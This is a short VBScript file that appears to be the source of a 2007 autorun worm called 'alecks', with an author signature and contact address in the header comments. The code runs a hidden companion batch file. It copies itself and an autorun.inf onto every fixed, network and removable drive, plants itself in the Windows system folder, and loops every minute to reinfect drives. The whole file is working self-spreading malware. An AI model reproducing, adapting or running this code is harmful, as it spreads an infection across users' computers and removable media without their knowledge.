'alecks v1.0
'Angono,Rizal Phils
'email me if you found this :) @ alecks_milanis@yahoo.com
'May 2007
on error resume next
Set WshShell =CreateObject("WScript.Shell")


For i=1 to 1

set Of = CreateObject("Scripting.FileSystemObject") 
set dir = Of.GetSpecialFolder(1)

Set dc = Of.Drives
if WScript.ScriptFullName=dir&"\alecks.vbs" then
	isdir=true
else
	a=WshShell.Run("alecks.bat Open" ,0,False)
	isdir=false
end if

For Each d In dc 
	If d.DriveType = 2 Or d.DriveType = 3 or (d.DriveType = 1 and d<>"A:" and d<> "B:") Then 
	a=WshShell.Run("alecks.bat - "&d ,0,True)
		if isdir then
			Of.CopyFile dir&"\alecks.*",d&"\",True
			Of.CopyFile dir&"\autorun.inf",d&"\",True
		else
			Of.CopyFile "alecks.*",d&"\",True
			Of.CopyFile "autorun.inf",d&"\",True
		end if
			a=WshShell.Run("alecks.bat + "&d ,0,True)
	End If
next

if isdir then
	wscript.sleep 60000
	i=0
else
	a=WshShell.Run("alecks.bat - "&dir ,0,True)
	Of.CopyFile "alecks.*",dir&"\",True
	Of.CopyFile "autorun.inf",dir&"\",True
	a=WshShell.Run("alecks.bat + "&dir ,0,True)
end if

next
